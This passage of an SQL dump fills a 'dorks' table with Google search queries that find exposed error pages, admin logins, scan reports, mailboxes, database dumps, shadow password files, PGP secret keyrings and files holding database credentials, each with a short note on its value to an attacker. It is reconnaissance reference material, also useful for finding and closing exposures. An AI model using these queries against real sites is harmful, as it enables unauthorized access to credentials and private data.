(90, '"An illegal character has been found in the statement" -"previous message"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=%22An+illegal+character+has+been+found+in+the+statement%22+-%22previous+message%22', 1998, '2004-03-04', 'An Informix error message, this message can display path names, function names, filenames and partial code, all of which are very helpful for hackers...', '2004-03-04', NULL, NULL),
(91, '"A syntax error has occurred" filetype:ihtml', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=%22A+syntax+error+has+occurred%22+filetype%3Aihtml', 1461, '2004-03-04', 'An Informix error message, this message can display path names, function names, filenames and partial code, all of which are very helpful for hackers', '2004-03-04', NULL, NULL),
(92, '"detected an internal error [IBM][CLI Driver][DB2/6000]"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=%22detected+an+internal+error+%5BIBM%5D%5BCLI+Driver%5D%5BDB2%2F6000%5D%22', 1778, '2004-03-04', 'A DB2 error message, this message can display path names, function names, filenames, partial code and program state, all of which are very helpful for hackers...', '2004-03-04', NULL, NULL),
(93, 'An unexpected token "END-OF-STATEMENT" was found', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=An+unexpected+token+%22END-OF-STATEMENT%22+was+found', 1307, '2004-03-04', 'A DB2 error message, this message can display path names, function names, filenames, partial code and program state, all of which are very helpful for hackers...', '2004-03-04', NULL, NULL),
(94, 'intitle:"statistics of" "advanced web statistics"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=intitle%3A%22statistics+of%22+%22advanced+web+statistics%22', 1391, '2004-03-04', 'the awstats program shows web statistics for web servers. This information includes who is visiting the site, what pages they visit, error codes produced, filetypes hosted on the server, number of hits, and more which can provide very interesting recon information for an attacker.', '2004-03-04', NULL, NULL),
(95, 'intitle:"Usage Statistics for" "Generated by Webalizer"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=intitle%3A%22Usage+Statistics+for%22+%22Generated+by+Webalizer%22', 5451, '2004-03-04', 'The webalizer program shows web statistics for web servers. This information includes who is visiting the site, what pages they visit, error codes produced, filetypes hosted on the server, number of hits, referrers, exit pages, and more which can provide very interesting recon information for an attacker.', '2004-03-04', NULL, NULL),
(96, '"robots.txt" "Disallow:" filetype:txt', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=%22robots%2Etxt%22+%2B+%22Disallow%3A%22+filetype%3Atxt', 3289, '2004-03-04', 'The robots.txt file serves as a set of instructions for web crawlers. The "disallow" tag tells a web crawler where NOT to look, for whatever reason. Hackers will always go to those places first!', '2004-03-04', NULL, NULL),
(97, '"Warning: pg_connect(): Unable to connect to PostgreSQL server: FATAL"', 'http://www.google.com/search?num=100&hl=en&lr=&ie=UTF-8&safe=off&q=%22Warning%3A+pg_connect%28%29%3A+Unable+to+connect+to+PostgreSQL+server%3A+FATAL%22', 1406, '2004-08-25', 'This search reveals Postgresql servers in yet another way then we had seen before. Path information appears in the error message and sometimes database names.', '2004-08-25', NULL, NULL),
(98, '"phpMyAdmin" "running on" inurl:"main.php"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&safe=off&q=%22phpMyAdmin%22+%22running+on%22+inurl%3A%22main.php%22&btnG=Google+Search', 1439, '2004-03-04', 'From phpmyadmin.net : "phpMyAdmin is a tool written in PHP intended to handle the administration of MySQL over the WWW." Great, easy to use, but lock it down! Things you can do include viewing MySQL runtime information and  system variables, show processes, reloading MySQL, changing privileges, and modifying or exporting databases. Hacker-fodder for sure!', '2004-03-04', NULL, NULL),
(99, 'inurl:main.php phpMyAdmin', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&safe=off&q=inurl%3Amain.php+phpMyAdmin', 1319, '2004-03-04', 'From phpmyadmin.net : "phpMyAdmin is a tool written in PHP intended to handle the administration of MySQL over the WWW." Great, easy to use, but lock it down! Things you can do include viewing MySQL runtime information and  system variables, show processes, reloading MySQL, changing privileges, and modifying or exporting databases. Hacker-fodder for sure!', '2004-03-04', NULL, NULL),
(100, 'inurl:main.php Welcome to phpMyAdmin', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&safe=off&q=inurl%3Amain.php+Welcome+to+phpMyAdmin', 1839, '2004-03-04', 'From phpmyadmin.net : "phpMyAdmin is a tool written in PHP intended to handle the administration of MySQL over the WWW." Great, easy to use, but lock it down! Things you can do include viewing MySQL runtime information and  system variables, show processes, reloading MySQL, changing privileges, and modifying or exporting databases. Hacker-fodder for sure!', '2004-03-04', NULL, NULL),
(101, '"Warning: Cannot modify header information - headers already sent"', 'http://www.google.com/search?sourceid=navclient&ie=UTF-8&oe=UTF-8&q=%22Warning%3A+Cannot+modify+header+information+%2D+headers+already+sent%22', 1237, '2004-03-04', 'A PHP error message, this message can display path names, function names, filenames and partial code, all of which are very helpful for hackers...', '2004-03-04', NULL, NULL),
(102, 'intitle:"wbem" compaq login "Compaq Information Technologies Group"', 'http://www.google.com/search?q=intitle:%22wbem%22+compaq+login+%22Compaq+Information+Technologies+Group%22&hl=en&lr=&c2coff=1&filter=0', 1430, '2004-03-04', 'These devices are running HP Insight Management Agents for Servers which "provide device information for all managed subsystems. Alerts are generated by SNMP traps." The information on these pages include server addresses and other assorted SNMP information.', '2004-03-04', NULL, NULL),
(103, 'intitle:osCommerce inurl:admin intext:"redistributable under the GNU"intext:"Online Catalog" -demo -site:oscommerce.com', 'http://www.google.com/search?q=intitle:osCommerce+inurl:admin+intext:%22redistributable+under+the+GNU%22intext:%22Online+Catalog%22+-demo+-site:oscommerce.com', 1950, '2004-03-04', 'This is a decent way to explore the admin interface of osCommerce e-commerce sites. Depending on how bad the setup of the web store is, web surfers can even Google their way into customer details and order status, all from the Google cache.', '2004-03-04', NULL, NULL),
(104, 'intitle:index.of "Apache" "server at"', 'http://www.google.com/search?&ie=UTF-8&oe=UTF-8&q=intitle%3Aindex%2Eof+%22Apache%22+%22server+at%22', 1410, '2004-03-04', 'This is a very basic string found on directory listing pages which show the version of the Apache web server. Hackers can use this information to find vulnerable targets without querying the servers.', '2004-03-04', NULL, NULL),
(105, '"access denied for user" "using password"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=%22access+denied+for+user%22+%22using+password%22', 1671, '2004-03-04', 'Another SQL error message, this message can display the username, database, path names and partial SQL code, all of which are very helpful for hackers...', '2004-03-04', NULL, NULL),
(106, 'intitle:"Under construction" "does not currently have"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=intitle%3A%22Under+construction%22+%22does+not+currently+have%22', 1612, '2004-03-04', 'This error message can be used to narrow down the operating system and web server version which can be used by hackers to mount a specific attack.', '2004-03-04', NULL, NULL),
(107, '"seeing this instead" intitle:"test page for apache"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=%22seeing+this+instead%22+intitle%3A%22test+page+for+apache%22', 2013, '2004-03-04', 'This is the default web page for Apache 1.3.11 - 1.3.26. Hackers can use this information to determine the version of the web server, or to search Google for vulnerable targets. In addition, this indicates that the web server is not well maintained.', '2004-03-04', NULL, NULL),
(109, 'intitle:"Test Page for Apache" "It Worked!" "on this web"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=intitle%3A%22Test+Page+for+Apache%22+%22It+Worked%21%22+%22on+this+web%22', 3289, '2004-03-04', 'This is the default web page for Apache 1.2.6 - 1.3.9. Hackers can use this information to determine the version of the web server, or to search Google for vulnerable targets. In addition, this indicates that the web server is not well maintained.', '2004-03-04', NULL, NULL),
(110, '"Can''t connect to local" intitle:warning', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=%22Can%27t+connect+to+local%22+intitle%3Awarning', 1532, '2004-03-04', 'Another SQL error message, this message can display database name, path names and partial SQL code, all of which are very helpful for hackers...', '2004-03-04', NULL, NULL),
(111, 'intitle:index.of dead.letter', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=intitle%3Aindex.of+dead.letter', 2103, '2004-03-04', 'dead.letter contains the contents of unfinished emails created on the UNIX platform. Emails (finished or not) can contain sensitive information.', '2004-03-04', NULL, NULL),
(112, 'intitle:index.of ws_ftp.ini', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=intitle%3Aindex.of+ws_ftp.ini', 2270, '2004-03-04', 'ws_ftp.ini is a configuration file for a popular FTP client that stores usernames, (weakly) encoded passwords, sites and directories that the user can store for later reference. These should not be on the web!', '2004-03-04', NULL, NULL),
(113, 'intitle:index.of administrators.pwd', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=intitle%3Aindex.of+administrators.pwd', 3714, '2004-03-04', 'This file contains administrative user names and (weakly) encrypted password for Microsoft Front Page. The file should not be readble to the general public.', '2004-03-04', NULL, NULL),
(114, 'inurl:secring ext:skr | ext:pgp | ext:bak', 'http://www.google.com/search?q=inurl:secring+ext:skr+%7C+ext:pgp+%7C+ext:bak', 1544, '2004-03-04', 'This file is the secret keyring for PGP encryption. Armed with this file (and perhaps a passphrase), a malicious user can read all your encrypted files! This should not be posted on the web!', '2004-03-04', NULL, NULL),
(115, 'intitle:Index.of etc shadow', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=intitle%3AIndex.of+etc+shadow', 2833, '2004-03-04', 'This file contains usernames and (lame) encrypted passwords! Armed with this file and a decent password cracker, an attacker can crack passwords and log into a UNIX system.', '2004-03-04', NULL, NULL),
(117, 'intitle:"Terminal Services Web Connection"', 'http://www.google.com/search?&ie=UTF-8&oe=UTF-8&q=intitle%3A%22Terminal+Services+Web+Connection%22', 1941, '2004-03-04', 'Microsoft Terminal Services Web Connector pages. These pages are not necessarily insecure, sine many layers of security can be wrapped around the actual use of this service, but simply being able to find these in Google gives hackers an informational advantage, and many of the sites are not implemented securely. In the worst case scenario these pages may allow an attacker to bypass a firewall gaining access to a "protected" machine.', '2004-03-04', NULL, NULL),
(119, '"Welcome to Intranet"', 'http://www.google.com/search?&ie=UTF-8&oe=UTF-8&q=%22Welcome+to+Intranet%22', 2060, '0000-00-00', 'According to whatis.com: "An intranet is a private network that is contained within an enterprise. [...] The main purpose of an intranet is to share company information and computing resources among employees [...] and in general looks like a private version of the Internet." Intranets, by definition should not be available to the Internet''s unwashed masses as they may contain private corporate information.', '0000-00-00', NULL, NULL),
(122, 'inurl:info.inc.php', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=inurl%3Ainfo.inc.php', 1562, '2004-03-14', 'From http://www.securityfocus.com/bid/9664, the AllMyPHP family of products (Versions 0.1.2 - 0.4) contains several potential vulnerabilities, som elalowing an attacker to execute malicious code on the web server.', '2004-03-14', NULL, NULL),
(123, 'inurl:admin intitle:login', 'http://www.google.com/search?&ie=UTF-8&oe=UTF-8&q=inurl%3Aadmin+intitle%3Alogin', 1278, '2004-03-14', 'This search can find administrative login pages. Not a vulnerability in and of itself, this query serves as a locator for administrative areas of a site. Further investigation of the surrounding directories can often reveal interesting information.', '2004-03-14', NULL, NULL),
(124, 'intitle:admin intitle:login', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=intitle%3Aadmin+intitle%3Alogin', 1261, '2004-03-14', 'This search can find administrative login pages. Not a vulnerability in and of itself, this query serves as a locator for administrative areas of a site. Further investigation of the surrounding directories can often reveal interesting information.', '2004-03-14', NULL, NULL),
(125, 'filetype:asp "Custom Error Message" Category Source', 'http://www.google.com/search?q=filetype:asp+%22Custom+Error+Message%22+Category+Source&ie=UTF-8&oe=UTF-8', 1339, '2004-03-16', 'This is an ASP error message that can reveal information such as compiler used, language used, line numbers, program names and partial source code.', '2004-03-16', NULL, NULL),
(126, '"Fatal error: Call to undefined function" -reply -the -next', 'http://www.google.com/search?q=%22Fatal+error:+Call+to+undefined+function%22+-reply+-the+-next&hl=en&lr=lang_en&ie=UTF-8&oe=UTF-8&start=10&sa=N', 1353, '2004-03-16', 'This error message can reveal information such as compiler used, language used, line numbers, program names and partial source code.', '2004-03-16', NULL, NULL),
(127, 'inurl:admin filetype:xls', 'http://www.google.com/search?hl=en&lr=lang_en&ie=UTF-8&oe=UTF-8&q=inurl%3Aadmin+filetype%3Axls&btnG=Google+Search', 1388, '2004-03-16', 'This search can find Excel spreadsheets in an administrative directory or of an administrative nature. Many times these documents contain sensitive information.', '2004-03-16', NULL, NULL),
(131, '"Welcome to PHP-Nuke" congratulations', 'http://www.google.com/search?q=%22Welcome+to+PHP-Nuke%22+congratulations&ie=UTF-8&oe=UTF-8', 2686, '2004-03-18', 'This finds default installations of the postnuke CMS system. In many cases, default installations can be insecure especially considering that the administrator hasn''t gotten past the first few installation steps.', '2004-03-18', NULL, NULL),
(135, 'warning "error on line" php sablotron', 'http://www.google.com/search?hl=en&lr=&ie=ISO-8859-1&safe=off&q=warning+%22error+on+line%22+php+sablotron', 1521, '2004-03-11', 'sablotron is an XML toolit thingie. This query hones in on error messages generated by this toolkit. These error messages reveal all sorts of interesting stuff such as source code snippets, path and filename info, etc.', '2004-03-11', NULL, NULL),
(136, '"Most Submitted Forms and Scripts" "this section"', 'http://www.google.com/search?&ie=UTF-8&oe=UTF-8&q=%22Most+Submitted+Forms+and+Scripts%22+%22this+section%22', 1434, '2004-03-22', 'More www statistics on the web. This one is very nice.. Lots of directory info, and client access statistics, email addresses.. lots of good stuff.These are SOOO dangerous, especially if INTRANET users get logged... talk about mapping out an intranet quickly...', '2004-03-22', NULL, NULL);
INSERT INTO `dorks` (`dork_id`, `title`, `link`, `hits`, `date`, `description`, `dateSubmission`, `vulnSoftVersion`, `exploitID`) VALUES
(137, 'inurl:changepassword.asp', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=inurl%3Achangepassword.asp&btnG=Google+Search', 1390, '2004-03-24', 'This is a common script for changing passwords. Now, this doesn''t actually reveal the password, but it provides great information about the security layout of a server. These links can be used to troll around a website.', '2004-03-24', NULL, NULL),
(139, '"not for distribution" confidential', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=%22not+for+distribution%22+confidential', 1634, '2004-03-29', 'The terms "not for distribution" and confidential indicate a sensitive document. Results vary wildly, but web-based documents are for public viewing, and should neither be considered confidential or private.', '2004-03-29', NULL, NULL),
(140, '"Thank you for your order" +receipt', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=%22Thank+you+for+your+order%22+%2Breceipt', 2920, '2004-03-29', 'After placing an order via the web, many sites provide a page containing the phrase "Thank you for your order" and provide a receipt for future reference. At the very least, these pages can provide insight into the structure of a web-based shop.', '2004-03-29', NULL, NULL),
(141, 'allinurl:intranet admin', 'http://www.google.com/search?&ie=UTF-8&oe=UTF-8&q=allinurl%3Aintranet+admin', 2042, '2004-03-29', 'According to whatis.com: "An intranet is a private network that is contained within an enterprise. [...] The main purpose of an intranet is to share company information and computing resources among employees [...] and in general looks like a private version of the Internet." Intranets, by definition should not be available to the Internet''s unwashed masses as they may contain private corporate information. Some of these pages are simply portals to an Intranet site, which helps with information gathering.', '2004-03-29', NULL, NULL),
(142, 'intitle:"Nessus Scan Report" "This file was generated by Nessus"', 'http://www.google.com/search?q=%0Aintitle%3A%22Nessus+Scan+Report%22+%22This+file+was+generated+by+Nessus%22+', 2571, '2004-03-30', 'This search yeids nessus scan reports. Even if some of the vulnerabilities have been fixed, we can still gather valuable information about the network/hosts. This also works with ISS and any other vulnerability scanner which produces reports in html or text format.', '2004-03-30', NULL, NULL),
(143, 'intitle:"index.of.personal"', 'http://www.google.com/search?hl=en&ie=UTF-8&oe=UTF-8&q=intitle%3A%22index.of.personal%22&btnG=Google+Search', 4000, '2004-03-29', 'This directory has various personal documents and pictures.', '2004-03-29', NULL, NULL),
(144, '"This report lists" "identified by Internet Scanner"', 'http://www.google.com/search?&ie=UTF-8&oe=UTF-8&q=%22This+report+lists%22+%22identified+by+Internet+Scanner%22', 1873, '2004-03-30', 'This search yeids ISS scan reports, revealing potential vulnerabilities on hosts and networks. Even if some of the vulnerabilities have been fixed, information about the network/hosts can still be gleaned.', '2004-03-30', NULL, NULL),
(145, '"Network Host Assessment Report" "Internet Scanner"', 'http://www.google.com/search?&ie=UTF-8&oe=UTF-8&q=%22Network+Host+Assessment+Report%22+%22Internet+Scanner%22', 1838, '2004-03-30', 'This search yeids ISS scan reports, revealing potential vulnerabilities on hosts and networks. Even if some of the vulnerabilities have been fixed, information about the network/hosts can still be gleaned.', '2004-03-30', NULL, NULL),
(146, '"Network Vulnerability Assessment Report"', 'http://www.google.com/search?&ie=UTF-8&oe=UTF-8&q=%22Network+Vulnerability+Assessment+Report%22', 1664, '2004-03-30', 'This search yeids vulnerability scanner reports, revealing potential vulnerabilities on hosts and networks. Even if some of the vulnerabilities have been fixed, information about the network/hosts can still be gleaned.', '2004-03-30', NULL, NULL),
(147, '"Host Vulnerability Summary Report"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=%22Host+Vulnerability+Summary+Report%22+', 2054, '2004-03-30', 'This search yeids host vulnerability scanner reports, revealing potential vulnerabilities on hosts and networks. Even if some of the vulnerabilities have been fixed, information about the network/hosts can still be gleaned.', '2004-03-30', NULL, NULL),
(148, 'intitle:index.of inbox', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=intitle%3Aindex.of+inbox', 1588, '2004-04-05', 'This search reveals potential location for mailbox files. In some cases, the data in this directory or file may be of a very personal nature and may include sent and received emails and archives of email data.', '2004-04-05', NULL, NULL),
(149, 'intitle:index.of inbox dbx', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=intitle%3Aindex.of+inbox+dbx', 7911, '2004-04-05', 'This search reveals potential location for mailbox files. In some cases, the data in this directory or file may be of a very personal nature and may include sent and received emails and archives of email data.', '2004-04-05', NULL, NULL),
(150, 'intitle:index.of cleanup.log', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=intitle%3Aindex.of+inbox+dbx', 3179, '2004-04-05', 'This search reveals potential location for mailbox files by keying on the Outlook Express cleanup.log file. In some cases, the data in this directory or file may be of a very personal nature and may include sent and received emails and archives of email data.', '2004-04-05', NULL, NULL),
(151, '"#mysql dump" filetype:sql', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=%22%23mysql+dump%22+filetype%3Asql&btnG=Search', 2037, '2004-04-05', 'This reveals mySQL database dumps. These database dumps list the structure and content of databases, which can reveal many different types of sensitive information.', '2004-04-05', NULL, NULL),
(153, 'inurl:vbstats.php "page generated"', 'http://www.google.com/search?&ie=UTF-8&oe=UTF-8&q=inurl%3Avbstats%2Ephp+%22page+generated%22', 1547, '2004-04-08', 'This is your typical stats page listing referrers and top ips and such. This information can certainly be used to gather information about a site and its visitors.', '2004-04-08', NULL, NULL),
(155, '"Index of" / "chat/logs"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=%22Index+of%22+%2F+%22chat%2Flogs%22+', 2406, '2004-04-13', 'This search reveals chat logs. Depending on the contents of the logs, these files could contain just about anything!', '2004-04-13', NULL, NULL),
(157, '"SnortSnarf alert page"', 'http://www.google.com/search?&ie=UTF-8&oe=UTF-8&q=%22SnortSnarf+alert+page%22', 1842, '2004-04-16', 'snort is an intrusion detection system. SnorfSnarf creates pretty web pages from intrusion detection data. These pages show what the bad guys are doing to a system. Generally, it''s a bad idea to show the bad guys what you''ve noticed.', '2004-04-16', NULL, NULL),
(158, 'inurl:"newsletter/admin/" intitle:"newsletter admin"', 'http://www.google.com/search?q=inurl:%22newsletter/admin/%22+intitle:%22newsletter+admin%22&hl=en', 1402, '2004-04-16', 'These pages generally contain newsletter administration pages. Some of these site are password protected, others are not, allowing unauthorized users to send mass emails to an entire mailing list.', '2004-04-16', NULL, NULL),
(159, 'inurl:"newsletter/admin/"', 'http://www.google.com/search?q=inurl:%22newsletter/admin/%22+intitle:%22newsletter+admin%22', 1421, '2004-04-16', 'These pages generally contain newsletter administration pages. Some of these site are password protected, others are not, allowing unauthorized users to send mass emails to an entire mailing list. This is a less acurate search than the similar intitle:"newsletter admin" search.', '2004-04-16', NULL, NULL),
(160, 'inurl:phpSysInfo/ "created by phpsysinfo"', 'http://www.google.com/search?&ie=UTF-8&oe=UTF-8&q=inurl%3AphpSysInfo%2F+%22created+by+phpsysinfo%22', 1586, '2004-04-16', 'This statistics program allows the an admin to view stats about a webserver. Some sites leave this in a publically accessible web page. Hackers could have access to data such as the real IP address of the server, server memory usage, general system info such as  OS, type of chip, hard-drive makers and much more.', '2004-04-16', NULL, NULL),
(161, 'allinurl: admin mdb', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=allinurl%3A+admin+mdb+', 2004, '2004-04-16', 'Not all of these pages are administrator''s access databases containing usernames, passwords and other sensitive information, but many are!', '2004-04-16', NULL, NULL),
(162, 'allinurl:"exchange/logon.asp"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=allinurl%3A%22exchange%2Flogon.asp%22', 1789, '2004-04-16', 'According to Microsoft "Microsoft (R) Outlook (TM) Web Access is a Microsoft Exchange Active Server Application that gives you private access to your Microsoft Outlook or Microsoft Exchange personal e-mail account so that you can view your Inbox from any Web Browser. It also allows you to view Exchange server public folders and the Address Book from the World Wide Web. Anyone can post messages anonymously to public folders or search for users in the Address Book. " Now, consider for a moment and you will understand why this could be potentially bad.', '2004-04-16', NULL, NULL),
(163, 'intitle:"Index of" cfide', 'http://www.google.com/search?hl=en&lr=&ie=ISO-8859-1&safe=off&q=intitle%3A%22Index+of%22+cfide', 1833, '2004-04-19', 'This is the top level directory of ColdFusion, a powerful web development environment. This directory most likely contains sensitive information about a ColdFusion developed site.', '2004-04-19', NULL, NULL),
(164, 'intitle:"ColdFusion Administrator Login"', 'http://www.google.com/search?&ie=UTF-8&oe=UTF-8&q=intitle%3A%22ColdFusion+Administrator+Login%22', 1536, '2004-04-19', 'This is the default login page for ColdFusion administration. Although many of these are secured, this is an indicator of a default installation, and may be inherantly insecure. In addition, this search provides good information about the version of ColdFusion as well as the fact that ColdFusion is installed on the server.', '2004-04-19', NULL, NULL),
(165, 'intitle:"Error Occurred" "The error occurred in" filetype:cfm', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=intitle%3A%22Error+Occurred%22+%22The+error+occurred+in%22+filetype%3Acfm', 1500, '2004-04-19', 'This is a typical error message from ColdFusion. A good amount of information is available from an error message like this including lines of source code, full pathnames, SQL query info, database name, SQL state info and local time info.', '2004-04-19', NULL, NULL),
(166, 'inurl:login.cfm', 'http://www.google.com/search?&ie=UTF-8&oe=UTF-8&q=inurl%3Alogin%2Ecfm', 1288, '2004-04-19', 'This is the default login page for ColdFusion. Although many of these are secured, this is an indicator of a default installation, and may be inherantly insecure. In addition, this search provides good information about the version of ColdFusion as well as the fact that ColdFusion is installed on the server.', '2004-04-19', NULL, NULL),
(167, 'filetype:cfm "cfapplication name" password', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=filetype%3Acfm+%22cfapplication+name%22+password', 1821, '2004-04-19', 'These files contain ColdFusion source code. In some cases, the pages are examples that are found in discussion forums. However, in many cases these pages contain live sourcecode with usernames, database names or passwords in plaintext.', '2004-04-19', NULL, NULL),
(168, 'inurl:":10000" intext:webmin', 'http://www.google.com/search?&ie=UTF-8&oe=UTF-8&q=inurl%3A%22%3A10000%22+intext%3Awebmin', 1495, '2004-04-20', 'Webmin is a html admin interface for Unix boxes. It is run on a proprietary web server listening on the default port of 10000.', '2004-04-20', NULL, NULL),
(169, 'allinurl:/examples/jsp/snp/snoop.jsp', 'http://www.google.com/search?&ie=UTF-8&oe=UTF-8&q=allinurl%3A%2Fexamples%2Fjsp%2Fsnp%2Fsnoop%2Ejsp', 1660, '2004-04-20', 'These pages reveal information about the server including path information, port information, etc.', '2004-04-20', NULL, NULL),
(170, 'allinurl:servlet/SnoopServlet', 'http://www.google.com/search?&ie=UTF-8&oe=UTF-8&q=allinurl%3Aservlet%2FSnoopServlet', 1311, '2004-04-20', 'These pages reveal server information such as port, server software version, server name, full paths, etc.', '2004-04-20', NULL, NULL),
(171, 'intitle:"Test Page for Apache"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=intitle%3A%22Test+Page+for+Apache+Installation%22', 1810, '2004-04-20', 'This is the default web page for Apache 1.2.6 - 1.3.9. Hackers can use this information to determine the version of the web server, or to search Google for vulnerable targets. In addition, this indicates that the web server is not well maintained.', '2004-04-20', NULL, NULL),
(172, 'inurl:login.asp', 'http://www.google.com/search?&ie=UTF-8&oe=UTF-8&q=inurl%3Alogin%2Easp', 1386, '2004-04-21', 'This is a typical login page. It has recently become a target for SQL injection. Comsec''s article at http://www.governmentsecurity.org/articles/SQLinjectionBasicTutorial.php brought this to my attention.', '2004-04-21', NULL, NULL),
(173, 'inurl:/admin/login.asp', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=inurl%3A%2Fadmin%2Flogin.asp+', 10341, '2004-04-21', 'This is a typical login page. It has recently become a target for SQL injection. Comsec''s article at http://www.governmentsecurity.org/articles/SQLinjectionBasicTutorial.php brought this to my attention.', '2004-04-21', NULL, NULL),
(174, '"Running in Child mode"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=%22Running+in+Child+mode%22+', 2157, '2004-04-21', 'This is a gnutella client that was picked up by google. There is a lot of data present including transfer statistics, port numbers, operating system, memory, processor speed, ip addresses, and gnutella client versions.', '2004-04-21', NULL, NULL),
(175, '"This is a Shareaza Node"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=%22This+is+a+Shareaza+Node%22', 2052, '2004-04-21', 'These pages are from Shareaza client programs. Various data is displayed including client version, ip address, listening ports and uptime.', '2004-04-21', NULL, NULL),
(176, '"VNC Desktop" inurl:5800', 'http://www.google.com/search?&ie=UTF-8&oe=UTF-8&q=%22VNC+Desktop%22+inurl%3A5800', 4462, '2004-04-21', 'VNC is a remote-controlled desktop product. Depending on the configuration, remote users may not be presented with a password. Even when presented with a password, the mere existance of VNC can be important to an attacker, as is the open port of 5800.', '2004-04-21', NULL, NULL),
(179, 'inurl:server-status "apache"', 'http://www.google.com/search?&ie=UTF-8&oe=UTF-8&q=inurl%3Aserver%2Dstatus+%22apache%22', 1337, '2004-04-26', 'This page shows all sort of information about the Apache web server. It can be used to track process information, directory maps, connection data, etc.', '2004-04-26', NULL, NULL),
(181, 'intitle:"index of" intext:connect.inc', 'http://www.google.com/search?q=intitle:%22index+of%22+intext:connect.inc+&hl=en&lr=&ie=UTF-8&oe=UTF-8&start=10&sa=N', 2230, '2004-04-26', 'These files often contain usernames and passwords for connection to mysql databases. In many cases, the passwords are not encoded or encrypted.', '2004-04-26', NULL, NULL),
(182, 'intitle:"MikroTik RouterOS Managing Webpage"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=intitle%3A%22MikroTik+RouterOS+Managing+Webpage%22+', 1972, '2004-04-26', 'This is the front page entry point to a "Mikro Tik" Router.', '2004-04-26', NULL, NULL),
(183, 'inurl:fcgi-bin/echo', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=inurl%3Afcgi-bin%2Fecho', 1277, '2004-04-28', 'This is the fastcgi echo script, which provides a great deal of information including port numbers, server software versions, port numbers, ip addresses, path names, file names, time zone, process id''s, admin email, fqdns, etc!', '2004-04-28', NULL, NULL),
(184, 'inurl:cgi-bin/printenv', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=inurl%3Acgi-bin%2Fprintenv', 1439, '2004-04-28', 'This is the print environemnts script which lists sensitive information such as path names, server names, port numbers, server software and version numbers, administrator email addresses and more.', '2004-04-28', NULL, NULL),
(185, 'intitle:"Execution of this script not permitted"', 'http://www.google.com/search?&ie=UTF-8&oe=UTF-8&q=intitle%3A%22Execution+of+this+script+not+permitted%22+Contact+phone', 1408, '2004-04-28', 'This is a cgiwrap error message which displays admin name and email, port numbers, path names, and may also include optional information like phone numbers for support personnel.', '2004-04-28', NULL, NULL),
(186, 'inurl:perl/printenv', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=inurl%3Aperl%2Fprintenv', 1263, '2004-04-28', 'This is the print environemnts script which lists sensitive information such as path names, server names, port numbers, server software and version numbers, administrator email addresses and more.', '2004-04-28', NULL, NULL),
(187, 'inurl:j2ee/examples/jsp', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=inurl%3Aj2ee%2Fexamples%2Fjsp', 1611, '2004-04-28', 'This directory contains sample JSP scripts which are installed on the server. These programs may have security vulnerabilities and can be used by an attacker to footprint the server.', '2004-04-28', NULL, NULL),
(189, 'inurl:server-info "Apache Server Information"', 'http://www.google.com/search?hl=en&lr=&ie=UTF-8&oe=UTF-8&q=inurl%3Aserver-info+%22Apache+Server+Information%22', 1273, '2004-04-28', 'This is the Apache server-info program. There is so much sensitive stuff listed on this page that it''s hard to list it all here. Some informatino listed here includes server version and build, software versions, hostnames, ports, path info, modules installed, module info, configuration data and so much more....', '2004-04-28', NULL, NULL),
